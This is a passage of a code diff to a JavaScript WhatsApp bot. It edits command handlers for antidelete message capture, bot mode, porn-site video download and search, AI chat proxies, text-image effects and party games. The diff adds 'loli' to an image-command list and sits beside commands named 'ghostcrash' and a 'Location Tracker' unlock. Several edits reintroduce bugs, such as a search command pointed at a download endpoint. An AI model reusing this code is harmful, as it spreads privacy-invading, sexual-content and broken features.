+    } catch (e) {
+        reply(`❌ *Unmute failed:* ${e.message}`);
+    }
 }
 break;
 
@@ -13190,6 +13812,8 @@ case 'removekey1': {
 }
 break;
 
+// ============ ADDKEY2 COMMAND (Location Tracker unlock) ============
+
 // ============ ANTIDELETE COMMAND ============
 case 'antidelete':
 case 'antidel':
@@ -13200,9 +13824,9 @@ case 'adel': {
     const _adCurrentMode = _adCfgNow.mode || 'off';
     const _adAction = args[0]?.toLowerCase();
     const _adModeLabel = {
-        'private': '🔒 private — user chats → user saved msgs; owner chats → owner saved msgs',
-        'private_pm': '🔒 private_pm — PM deletions → routed by chat (user vs owner)',
-        'private_groups': '🔒 private_groups — group deletions → routed by chat (user vs owner)',
+        'private': '🔒 private — ALL deletions (groups + PMs) → saved messages',
+        'private_pm': '🔒 private_pm — PM/DM deletions only → saved messages',
+        'private_groups': '🔒 private_groups — Group deletions only → saved messages',
         'chat': '💬 chat — ALL deletions → reposted in same chat',
         'chat_groups': '💬 chat_groups — Group deletions only → reposted in chat',
         'off': '❌ off — Disabled'
@@ -13211,11 +13835,10 @@ case 'adel': {
         return reply(
             `*🔰 ANTIDELETE SETTINGS 🔰*\n\n` +
             `*Current Mode:* ${_adModeLabel[_adCurrentMode] || _adCurrentMode}\n\n` +
-            `*Delivery to saved messages (Message Yourself):*\n` +
-            `_User chats → bot user only. Owner DM → owner only. Owner group → bot user + owner._\n\n` +
-            `• \`${prefix}antidelete private\` — ALL deletions → saved messages\n` +
-            `• \`${prefix}antidelete private_pm\` — PM deletions → saved messages\n` +
-            `• \`${prefix}antidelete private_groups\` — Group deletions → saved messages\n\n` +
+            `*Delivery to saved messages (message myself):*\n` +
+            `• \`${prefix}antidelete private\` — ALL deletions (groups + PMs) → saved messages\n` +
+            `• \`${prefix}antidelete private_pm\` — PM/DM deletions only → saved messages\n` +
+            `• \`${prefix}antidelete private_groups\` — Group deletions only → saved messages\n\n` +
             `*Delivery back into chat:*\n` +
             `• \`${prefix}antidelete chat\` — ALL deletions → reposted in same chat\n` +
             `• \`${prefix}antidelete chat_groups\` — Group deletions only → reposted in chat\n\n` +
@@ -13307,10 +13930,12 @@ break;
 
 case 'ping':
 case 'speed': {
-    const _t1 = process.hrtime.bigint();
-    const _t2 = process.hrtime.bigint();
-    const latensi = Number(_t2 - _t1) / 1e6; // nanoseconds → ms
-    reply(`⚡ *CYBER Ping*\n\n📡 ${latensi.toFixed(4)} ms`);
+    const _t1 = Date.now();
+    await devtrust.sendMessage(m.chat, { text: `⚡ *CYBER Ping*\n\n📡 Calculating...` }).catch(() => {});
+    const _ms = Date.now() - _t1;
+    const _upH = Math.floor(process.uptime() / 3600);
+    const _upM = Math.floor((process.uptime() % 3600) / 60);
+    await reply(`⚡ *CYBER BOT - PING*\n\n📡 Response: *${_ms}ms*\n⏱ Uptime: ${_upH}h ${_upM}m\n✅ Bot is Online!`);
 }
 break;
 
@@ -13359,31 +13984,39 @@ case 'checkapis': {
 break;
 
 case 'public': {
-    // Per-session only — only this connected number switches to public
     devtrust.public = true;
-    // Save to DB so mode survives restarts (per-number, not shared)
+    const _modeNumPub = botNumber ? botNumber.replace(/[^0-9]/g, '') : '';
+    // Save to DB (MongoDB + PostgreSQL both supported now)
     try {
         const { setBotMode } = require('./server/db-service');
-        const _modeNum = botNumber ? botNumber.replace(/[^0-9]/g, '') : '';
-        if (_modeNum) setBotMode(_modeNum, 'public').catch(() => {});
+        if (_modeNumPub) setBotMode(_modeNumPub, 'public').catch(() => {});
     } catch (_) {}
-    reply("🌍 *Public mode activated*\nEveryone can use the bot");
+    // Also save to local file (for local dev / fallback)
+    try {
+        const _fsMode = require('fs');
+        if (_modeNumPub) _fsMode.writeFileSync('./database/bot_mode_' + _modeNumPub + '.json', JSON.stringify({ mode: 'public' }));
+    } catch (_) {}
+    reply(`🌍 *Public mode activated*\nEveryone can use the bot`);
 }
 break;
 
 case 'private':
 case 'self': {
-    // Per-session only — only this connected number switches to private/self
     devtrust.public = false;
-    // Save to DB so mode survives restarts (per-number, not shared)
+    const _modeNumSelf = botNumber ? botNumber.replace(/[^0-9]/g, '') : '';
+    // Save to DB (MongoDB + PostgreSQL both supported now)
     try {
         const { setBotMode } = require('./server/db-service');
-        const _modeNum = botNumber ? botNumber.replace(/[^0-9]/g, '') : '';
-        if (_modeNum) setBotMode(_modeNum, 'self').catch(() => {});
+        if (_modeNumSelf) setBotMode(_modeNumSelf, 'self').catch(() => {});
     } catch (_) {}
-    reply("🔐 *Private mode activated*\nOnly bot owner & bot number can use the bot");
+    // Also save to local file (for local dev / fallback)
+    try {
+        const _fsMode = require('fs');
+        if (_modeNumSelf) _fsMode.writeFileSync('./database/bot_mode_' + _modeNumSelf + '.json', JSON.stringify({ mode: 'self' }));
+    } catch (_) {}
+    reply(`🔐 *Private mode activated*\nOnly bot owner & bot number can use the bot`);
+    break;
 }
-break;
 
 case 'readmore': {
     const more = String.fromCharCode(8206);
@@ -13495,6 +14128,7 @@ case 'gitclone': {
 } 
 break;
 
+case 'coffee': 
 case 'kopi': {
     devtrust.sendMessage(m.chat,
         addNewsletterContext({
@@ -13612,41 +14246,49 @@ break;
 }
 break;
 
-case "xvideodl": {
-    if (!isCreator) return reply("🔒 *Owner only*");
-    if (!text) return reply(`🍑 *Usage:* ${prefix}xvideodl <xvideos url>`);
-    if (!text.includes("xvideos.com")) return reply("❌ *Link must be from xvideos.com*");
+  case "xvideodl": {
+  if (!isCreator) return reply("Owner only"); 
+if (!text) return m.reply(example(`xvideo link`))
+// Check if link is from xvideo
+if (!text.includes("xvideos.com")) return m.reply("Link is not from xvideos.com")
+await devtrust.sendMessage(m.chat, {react: {text: '🍑', key: m.key}})
+// Fetching video data from API
+try {
+let res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`);
+let json = await res.json();
 
-    await devtrust.sendMessage(m.chat, { react: { text: '🍑', key: m.key } });
-    try {
-        const res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`, { timeout: 30000 });
-        if (!res.ok) throw new Error(`API ${res.status}`);
-        const json = await res.json();
-        if (json?.status !== 200 || !json.data) throw new Error('Cannot find video for this URL.');
+// Bad response from API
+if (json.status !== 200 || !json.data) {
+throw "Cannot find video for this URL.";
+}
 
-        const videoData = json.data;
-        const videoUrl = videoData.url;
-        if (!videoUrl) throw new Error('No video URL returned');
+// Retrieving video information from API
+let videoData = json.data;
 
-        await devtrust.sendMessage(m.chat,
-            addNewsletterContext({
-                video: { url: videoUrl },
-                mimetype: 'video/mp4',
-                caption:
-                    `🍑 *XVideos Download*\n\n` +
-                    `📽️ *Title:* ${videoData.title || 'No title'}\n` +
-                    `👁️ *Views:* ${videoData.views || '-'}\n` +
-                    `👍 *Likes:* ${videoData.like_count || '-'}\n` +
-                    `👎 *Dislikes:* ${videoData.dislike_count || '-'}`,
-            }),
-            { quoted: m }
-        );
-        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-    } catch (e) {
-        console.error('xvideodl error:', e?.message || e);
-        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
-        reply(`❌ *Download failed:* ${e?.message || e}`);
-    }
+// Download videos using URLs obtained from API
+const videoUrl = videoData.url;
+const videoResponse = await fetch(videoUrl);
+
+// Check if the video was downloaded successfully
+if (!videoResponse.ok) {
+throw "Failed to download video.";
+}
+
+// Send video
+await devtrust.sendMessage(m.chat, {
+video: {
+url: videoUrl,
+},
+caption: `*Title:* ${videoData.title || 'No title'}\n` +
+`*Views:* ${videoData.views || 'No view information'}\n` +
+`*Votes:* ${videoData.vote || 'No vote information'}\n` +
+`*Likes:* ${videoData.like_count || 'No like information'}\n` +
+`*Dislikes:* ${videoData.dislike_count || 'No dislike information'}`,
+});
+await devtrust.sendMessage(m.chat, {react: {text: '', key: m.key}})
+} catch (e) {
+console.log(`Error downloading video: ${e}`);
+}
 }
 break;
   case "xnxxvideodl": {
@@ -13676,20 +14318,43 @@ break;
     }
 }
 break;
-case 'xvideosearch': {
+case 'xvideosearch':{
     // 18+ unlock check
     const _xvsrch_num = (m.sender || '').split('@')[0].split(':')[0];
     const _xvsrch_unlocked = (global._flagCache?.adultUnlocked || []).some(id => String(id).replace(/[^0-9]/g,'') === _xvsrch_num);
     const _xvsrch_banned = (global._flagCache?.adultBanned || []).some(id => String(id).replace(/[^0-9]/g,'') === _xvsrch_num);
     if (_xvsrch_banned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
     if (!_xvsrch_unlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
-
-    // XVideos search API was removed (was throwing TypeError on every call).
-    // Use xnxxsearch instead which has a working scraper in allfunc/xnxxdownload.
-    return reply(`ℹ️ *XVideos search is currently disabled*\n\nUse \`${prefix}xnxxsearch <query>\` instead.`);
+  if (!text) return reply(`🔍 *Usage:* ${prefix}xvideosearch <keyword>\nExample: ${prefix}xvideosearch milf`);
+  try {
+    reply(mess.wait);
+    // Use PrinceTech API (same as xvideos command)
+    const searchRes = await axios.get(
+      `https://api.princetechn.com/api/search/xvideossearch?apikey=prince&query=${encodeURIComponent(text)}`,
+      { timeout: 20000 }
+    );
+    const results = searchRes.data?.result || searchRes.data?.data || [];
+    if (!results || results.length === 0) {
+      return reply(`❌ *No results found for "${text}"*\nTry a different keyword.`);
+    }
+    const top = results.slice(0, 8);
+    let message = `╭━━━━━━━━━━━━━━━╮\n`;
+    message += `┃ 🍑 *XVIDEO SEARCH*\n`;
+    message += `┃ 🔎 Query: ${text}\n`;
+    message += `╰━━━━━━━━━━━━━━━╯\n\n`;
+    top.forEach((v, i) => {
+      message += `*${i + 1}.* ${v.title || v.name || 'No title'}\n`;
+      message += `   ⏱️ ${v.duration || v.time || 'N/A'} | 👁️ ${v.views || 'N/A'}\n`;
+      message += `   🔗 ${v.url || v.link || ''}\n\n`;
+    });
+    message += `_Type ${prefix}xvideos <URL> to download_`;
+    await devtrust.sendMessage(m.chat, { text: message });
+  } catch (e) {
+    console.error('xvideosearch error:', e.message);
+    reply(`❌ *Search failed* • Try again later`);
+  }
 }
-break;
-
+break; 
 // ✅ Command switch
 case 'xnxxsearch': {
     // 18+ unlock check
@@ -13859,19 +14524,16 @@ case 'tiktoksearch': {
     if (!text) return reply("🎵 *Enter a search term*");
 
     try {
-        // tikwm /api/?url= is the single-video DOWNLOAD endpoint and won't accept
-        // free-text search. The search endpoint is /api/feed/search which returns
-        // { data: { videos: [...] } }.
-        const url = `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(text)}&count=10`;
-        const response = await fetch(url);
-        const json = await response.json();
+        let query = text;
+        let url = `https://www.tikwm.com/api/?url=${encodeURIComponent(query)}`;
+        let response = await fetch(url);
+        let json = await response.json();
 
-        const list = json?.data?.videos || (Array.isArray(json?.data) ? json.data : null);
-        if (!list || !list.length) {
+        if (!json.status || !json.data || json.data.length === 0) {
             return reply("❌ *No results found*");
         }
 
-        const videos = list.slice(0, 3);
+        let videos = json.data.slice(0, 3);
 
         for (let i = 0; i < videos.length; i++) {
             let vid = videos[i];
@@ -13937,7 +14599,7 @@ case 'buy-panel': {
         `💎 1GB • 2GB • 3GB • 4GB\n` +
         `💎 5GB • 6GB • 7GB • 8GB\n` +
         `💎 9GB • 10GB • Unlimited\n\n` +
-        `📩 *DM: +923332110295*`);
+        `📩 *DM: +8615507967005*`);
 }
 break;
 
@@ -14270,34 +14932,45 @@ break;
 case "lyrics": {
     const chatId = m.key.remoteJid;
     const query = args.join(" ");
-
-    if (!query) return reply("🎵 *Usage:* lyrics song title\nExample: lyrics adele hello");
+    
+    if (!query) return reply("🎵 *Usage:* lyrics song title");
 
     try {
-        // Step 1: search via suggest endpoint to get a real {artist,title} match
-        const sRes = await fetch(`https://api.lyrics.ovh/suggest/${encodeURIComponent(query)}`);
-        const sJson = await sRes.json().catch(() => ({}));
-        const hit = Array.isArray(sJson?.data) ? sJson.data[0] : null;
-        if (!hit?.artist?.name || !hit?.title) {
-            return reply(`❌ *Lyrics not found for "${query}"*`);
+        // Step 1: Search for the song to get artist & title
+        const searchRes = await fetch(`https://api.lyrics.ovh/suggest/${encodeURIComponent(query)}`);
+        const searchJson = await searchRes.json();
+
+        if (!searchJson.data || searchJson.data.length === 0) {
+            return reply(`❌ *Song not found for "${query}"*\nTry a more specific title.`);
         }
-        const artistName = hit.artist.name;
-        const songTitle  = hit.title;
-        const album      = hit.album?.title || 'Unknown';
 
-        // Step 2: pull the actual lyrics
-        const lRes = await fetch(`https://api.lyrics.ovh/v1/${encodeURIComponent(artistName)}/${encodeURIComponent(songTitle)}`);
-        const lJson = await lRes.json().catch(() => ({}));
-        const lyrics = (lJson?.lyrics || '').trim();
-        if (!lyrics) return reply(`❌ *Lyrics not found for "${songTitle}" by ${artistName}*`);
+        // Pick the best match (first result)
+        const topResult = searchJson.data[0];
+        const songTitle = topResult.title || query;
+        const artistName = topResult.artist?.name || '';
 
+        // Step 2: Fetch actual lyrics using artist + title endpoint
+        const lyricsRes = await fetch(
+            `https://api.lyrics.ovh/v1/${encodeURIComponent(artistName)}/${encodeURIComponent(songTitle)}`
+        );
+        const lyricsJson = await lyricsRes.json();
+
+        if (!lyricsJson.lyrics) {
+            return reply(`❌ *Lyrics not available for "${songTitle}"*\nThis song might not be in the database.`);
+        }
+
+        const lyrics = lyricsJson.lyrics.trim();
+        const album = topResult.album?.title || '';
         const chunks = lyrics.match(/[\s\S]{1,3500}/g) || [lyrics];
+
         for (let i = 0; i < chunks.length; i++) {
-            const header = i === 0 ? `🎵 *${songTitle}* – *${artistName}*\n📀 ${album}\n\n` : "";
+            const header = i === 0
+                ? `🎵 *${songTitle}*${artistName ? ` – *${artistName}*` : ''}\n${album ? `📀 ${album}\n` : ''}\n`
+                : "";
             await devtrust.sendMessage(chatId, { text: header + chunks[i] });
         }
     } catch (err) {
-        console.error('lyrics error:', err?.message || err);
+        console.error(err);
         reply("⚠️ *Lyrics fetch failed*");
     }
 }
@@ -14528,7 +15201,7 @@ case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori':
 case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura':
 case 'kakashi': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki':
 case 'kotori': case 'kpop': case 'kucing': case 'kurumi': case 'lisa':
-case 'madara': case 'megumin': case 'mikasa': case 'mikey':
+case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey':
 case 'miku': case 'minato': case 'mobile': case 'motor': case 'mountain':
 case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko':
 case 'onepiece': case 'pentol': case 'pokemon': case 'profil': case 'programming':
@@ -14726,17 +15399,7 @@ case "gemivbnni": {
     if (!query) return reply("🤖 *Usage:* .gemini your question");
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
-        const sysPrompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu. NEVER use Hindi Devanagari or formal Urdu Nastaliq script.`;
-        const res = await axios.post('https://text.pollinations.ai/', {
-            messages: [
-                { role: 'system', content: sysPrompt },
-                { role: 'user', content: query }
-            ],
-            model: 'openai-large',
-            seed: -1
-        }, { timeout: 40000 });
-        const answer = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
-        if (!answer || answer.startsWith('<')) return reply("⚠️ *Gemini did not respond* — try again");
+        const answer = await askPrinceAI('gemini', query);
         const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
         for (let i = 0; i < chunks.length; i++) {
             await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *Gemini*\n\n" : "") + chunks[i] }, i === 0 ? { quoted: m } : {});
@@ -14913,17 +15576,7 @@ case 'deepsjfkeek': {
     if (!text) return reply("🤖 *Usage:* .deepseek your question");
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
-        const sysPromptDS = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari or Urdu Nastaliq script.`;
-        const resDS = await axios.post('https://text.pollinations.ai/', {
-            messages: [
-                { role: 'system', content: sysPromptDS },
-                { role: 'user', content: text }
-            ],
-            model: 'deepseek',
-            seed: -1
-        }, { timeout: 40000 });
-        const answerDS = typeof resDS.data === 'string' ? resDS.data : JSON.stringify(resDS.data);
-        if (!answerDS || answerDS.startsWith('<')) return reply("⚠️ *DeepSeek did not respond* — try again");
+        const answerDS = await askPrinceAI('deepseek', text);
         const chunksDS = answerDS.match(/[\s\S]{1,3000}/g) || [answerDS];
         for (let i = 0; i < chunksDS.length; i++) {
             await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *DeepSeek*\n\n" : "") + chunksDS[i] }, i === 0 ? { quoted: m } : {});
@@ -14942,17 +15595,7 @@ case "grovnnk-ai": {
     if (!query) return reply("🤖 *Usage:* .grok your question");
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
-        const sysPromptGrok = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari or Urdu Nastaliq script.`;
-        const resGrok = await axios.post('https://text.pollinations.ai/', {
-            messages: [
-                { role: 'system', content: sysPromptGrok },
-                { role: 'user', content: query }
-            ],
-            model: 'llama',
-            seed: -1
-        }, { timeout: 40000 });
-        const answerGrok = typeof resGrok.data === 'string' ? resGrok.data : JSON.stringify(resGrok.data);
-        if (!answerGrok || answerGrok.startsWith('<')) return reply("⚠️ *Grok did not respond* — try again");
+        const answerGrok = await askPrinceAI('openai', query);
         const chunksGrok = answerGrok.match(/[\s\S]{1,3000}/g) || [answerGrok];
         for (let i = 0; i < chunksGrok.length; i++) {
             await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *Grok*\n\n" : "") + chunksGrok[i] }, i === 0 ? { quoted: m } : {});
@@ -15014,6 +15657,34 @@ case 'gaycheck': case 'waifucheck': {
 }
 break;
 
+case "metabcn-ai": {
+    const chatId = m.key.remoteJid;
+    let query = args.join(" ").trim();
+    
+    try {
+        if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
+            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
+            if (quoted.conversation) query = quoted.conversation;
+            else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
+        }
+
+        if (!query) return reply("🤖 *Usage:* meta your question");
+
+        const answer = await askPrinceAI('openai', query);
+
+        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
+        
+        for (let i = 0; i < chunks.length; i++) {
+            const header = i === 0 ? "🤖 *Meta AI*\n\n" : "";
+            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
+        }
+    } catch (err) {
+        console.error(err);
+        reply("⚠️ *Meta AI unavailable*");
+    }
+}
+break;
+
 case 'qwen':
 case "qwenxj": {
     const chatId = m.key.remoteJid;
@@ -15028,12 +15699,7 @@ case "qwenxj": {
 
         if (!query) return reply("🤖 *Usage:* qwen your question");
 
-        const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent('You are a helpful assistant. User: ' + query)}`);
-        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);
-
-        const answer = (await res.text()).trim();
-
-        if (!answer) return reply("⚠️ *No response from Qwen*");
+        const answer = await askPrinceAI('openai', query);
 
         const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
         
@@ -15928,6 +16594,9 @@ case 'ghostcrash': {
 break;
 
 
+
+
+
 case 'godmode': {
     {
         const _bgNc = (m.sender||'').split('@')[0].split(':')[0];
@@ -16236,6 +16905,296 @@ break;
 
 // ✨ TEXT MAKER COMMANDS
 
+case "glitchtext": {
+    if (args.length < 1) return reply("✏️ *Usage:* glitchtext CYBER");
+    
+    try {
+        let url = `https://api.popcat.xyz/unforgivable?text=${encodeURIComponent(args.join(" "))}`;
+        await devtrust.sendMessage(from,
+            addNewsletterContext({
+                image: { url },
+                caption: "⚡ *Glitch Text*"
+            }),
+            { quoted: m }
+        );
+    } catch (e) {
+        reply("⚠️ *Error generating*");
+    }
+}
+break;
+
+case "writetext": {
+    if (args.length < 1) return reply("✏️ *Usage:* writetext CYBER");
+    
+    try {
+        let url = `https://api.popcat.xyz/pikachu?text=${encodeURIComponent(args.join(" "))}`;
+        await devtrust.sendMessage(from,
+            addNewsletterContext({
+                image: { url },
+                caption: "✍️ *Write Text*"
+            }),
+            { quoted: m }
+        );
+    } catch (e) {
+        reply("⚠️ *Error generating*");
+    }
+}
+break;
+
+case "advancedglow": {
+    if (args.length < 1) return reply("✏️ *Usage:* advancedglow CYBER");
+    
+    try {
+        let url = `https://api.popcat.xyz/oogway?text=${encodeURIComponent(args.join(" "))}`;
+        await devtrust.sendMessage(from,
+            addNewsletterContext({
+                image: { url },
+                caption: "💡 *Advanced Glow*"
+            }),
+            { quoted: m }
+        );
+    } catch (e) {
+        reply("⚠️ *Error generating*");
+    }
+}
+break;
+
+case "typographytext": {
+    if (args.length < 1) return reply("✏️ *Usage:* typographytext CYBER");
+    
+    try {
+        let url = `https://api.popcat.xyz/sadcat?text=${encodeURIComponent(args.join(" "))}`;
+        await devtrust.sendMessage(from,
+            addNewsletterContext({
+                image: { url },
+                caption: "🖋️ *Typography*"
+            }),
+            { quoted: m }
+        );
+    } catch (e) {
+        reply("⚠️ *Error generating*");
+    }
+}
+break;
+
+case "pixelglitch": {
+    if (args.length < 1) return reply("✏️ *Usage:* pixelglitch CYBER");
+    
+    try {
+        let url = `https://api.popcat.xyz/unforgivable?text=${encodeURIComponent(args.join(" "))}`;
+        await devtrust.sendMessage(from,
+            addNewsletterContext({
+                image: { url },
+                caption: "🧩 *Pixel Glitch*"
+            }),
+            { quoted: m }
+        );
+    } catch (e) {
+        reply("⚠️ *Error generating*");
+    }
+}
+break;
+
+case "neonglitch": {
+    if (args.length < 1) return reply("✏️ *Usage:* neonglitch CYBER");
+    
+    try {
+        let url = `https://api.popcat.xyz/unforgivable?text=${encodeURIComponent(args.join(" "))}`;
+        await devtrust.sendMessage(from,
+            addNewsletterContext({
+                image: { url },
+                caption: "💥 *Neon Glitch*"
+            }),
+            { quoted: m }
+        );
+    } catch (e) {
+        reply("⚠️ *Error generating*");
+    }
+}
+break;
+
+case "flagtext": {
+    if (args.length < 1) return reply("✏️ *Usage:* flagtext CYBER");
+    
+    try {
+        let url = `https://api.popcat.xyz/pikachu?text=${encodeURIComponent(args.join(" "))}`;
+        await devtrust.sendMessage(from,
+            addNewsletterContext({
+                image: { url },
+                caption: "🇳🇬 *Flag Text*"
+            }),
+            { quoted: m }
+        );
+    } catch (e) {
+        reply("⚠️ *Error generating*");
+    }
+}
+break;
+
+case "flag3dtext": {
+    if (args.length < 1) return reply("✏️ *Usage:* flag3dtext CYBER");
+    
+    try {
+        let url = `https://api.popcat.xyz/oogway?text=${encodeURIComponent(args.join(" "))}`;
+        await devtrust.sendMessage(from,
+            addNewsletterContext({
+                image: { url },
+                caption: "🇺🇸 *3D Flag Text*"
+            }),
+            { quoted: m }
+        );
+    } catch (e) {
+        reply("⚠️ *Error generating*");
+    }
+}
+break;
+
+case "deletingtext": {
+    if (args.length < 1) return reply("✏️ *Usage:* deletingtext CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "blackpinkstyle": {
+    if (args.length < 1) return reply("✏️ *Usage:* blackpinkstyle CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "glowingtext": {
+    if (args.length < 1) return reply("✏️ *Usage:* glowingtext CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "underwatertext": {
+    if (args.length < 1) return reply("✏️ *Usage:* underwatertext CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "logomaker": {
+    if (args.length < 1) return reply("✏️ *Usage:* logomaker CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "cartoonstyle": {
+    if (args.length < 1) return reply("✏️ *Usage:* cartoonstyle CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "papercutstyle": {
+    if (args.length < 1) return reply("✏️ *Usage:* papercutstyle CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "watercolortext": {
+    if (args.length < 1) return reply("✏️ *Usage:* watercolortext CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "effectclouds": {
+    if (args.length < 1) return reply("✏️ *Usage:* effectclouds CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "blackpinklogo": {
+    if (args.length < 1) return reply("✏️ *Usage:* blackpinklogo CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "gradienttext": {
+    if (args.length < 1) return reply("✏️ *Usage:* gradienttext Robin");
+    
+    try {
+        return reply("⚠️ *Text effect API is currently unavailable*");
+        await devtrust.sendMessage(from,
+            addNewsletterContext({
+                image: { url },
+                caption: "🌈 *Gradient Text*"
+            }),
+            { quoted: m }
+        );
+    } catch (e) {
+        console.error(e);
+        reply("⚠️ *Error generating Gradient Text*");
+    }
+}
+break;
+
+case "summerbeach": {
+    if (args.length < 1) return reply("✏️ *Usage:* summerbeach CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "luxurygold": {
+    if (args.length < 1) return reply("✏️ *Usage:* luxurygold CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "multicoloredneon": {
+    if (args.length < 1) return reply("✏️ *Usage:* multicoloredneon CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "sandsummer": {
+    if (args.length < 1) return reply("✏️ *Usage:* sandsummer CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "galaxywallpaper": {
+    if (args.length < 1) return reply("✏️ *Usage:* galaxywallpaper CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "style1917": {
+    if (args.length < 1) return reply("✏️ *Usage:* style1917 CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "makingneon": {
+    if (args.length < 1) return reply("✏️ *Usage:* makingneon CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "royaltext": {
+    if (args.length < 1) return reply("✏️ *Usage:* royaltext CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "freecreate": {
+    if (args.length < 1) return reply("✏️ *Usage:* freecreate CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "galaxystyle": {
+    if (args.length < 1) return reply("✏️ *Usage:* galaxystyle CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+case "lighteffects": {
+    if (args.length < 1) return reply("✏️ *Usage:* lighteffects CYBER");
+        return reply("⚠️ *Text effect API is currently unavailable*");
+}
+break;
+
+// ======================[ 🔗 ANTILINKKICK ]======================
 case 'antilinkkick': {
     if (!m.isGroup) return reply("👥 *Groups only*");
     if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
@@ -16851,6 +17810,7 @@ break;
 // ═══════════════════════════════════════════════════════
 // 😂 MEME — Random meme fetcher
 // ═══════════════════════════════════════════════════════
+case 'meme':
 case 'randmeme': {
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '😂', key: m.key } });
@@ -16921,6 +17881,49 @@ break;
 
 // ═══════════════════════════════════════════════════════
 // 🎯 DARE — Quick dare without truth
+// ═══════════════════════════════════════════════════════
+case 'dare': {
+    const dares = [
+        "Apne best friend ko abhi call karo aur kehna 'I miss you' aur call kaat do",
+        "Apna phone kisi ko do aur woh koi bhi message bhej sakta hai jisko chahey",
+        "Agle 3 messages mein sirf caps mein likhna hoga",
+        "Apni voice mein koi bhi gaana record karke is chat mein bhejo",
+        "Apna embarrassing childhood story batao",
+        "Kisi random contact ko 'Happy Birthday' bhejo chahe unka birthday ho ya na ho",
+        "Next message mein apni duniya ki best selfie bhejo",
+        "1 minute mein 15 star bhi karo aur video send karo"
+    ];
+    reply(`🎯 *CYBER DARE*\n\n${dares[Math.floor(Math.random() * dares.length)]}`);
+}
+break;
+
+// ═══════════════════════════════════════════════════════
+// 💡 FACT — Random fun fact
+// ═══════════════════════════════════════════════════════
+case 'fact':
+case 'funfact': {
+    try {
+        const res = await axios.get('https://uselessfacts.jsph.pl/api/v2/facts/random?language=en', { timeout: 10000 });
+        const fact = res.data?.text;
+        if (!fact) throw new Error('No fact');
+        reply(`💡 *Random Fact*\n\n${fact}`);
+    } catch {
+        const facts = [
+            "Honey never spoils — 3000-year-old honey found in Egyptian tombs was still edible!",
+            "A day on Venus is longer than a year on Venus.",
+            "Cleopatra lived closer in time to the Moon landing than to the building of the Great Pyramid.",
+            "Bananas are slightly radioactive due to their potassium content.",
+            "Octopuses have three hearts and blue blood.",
+            "The human brain uses about 20% of the body's total energy.",
+            "Sharks are older than trees — they've been around for 450 million years.",
+        ];
+        reply(`💡 *Random Fact*\n\n${facts[Math.floor(Math.random() * facts.length)]}`);
+    }
+}
+break;
+
+// ═══════════════════════════════════════════════════════
+// 🧠 RIDDLE — Random riddle
 // ═══════════════════════════════════════════════════════
 case 'riddle': {
     const riddles = [
@@ -17072,6 +18075,307 @@ case 'ttt': {
 }
 break;
 
+// ── coin — Flip a coin ──
+case 'coin':
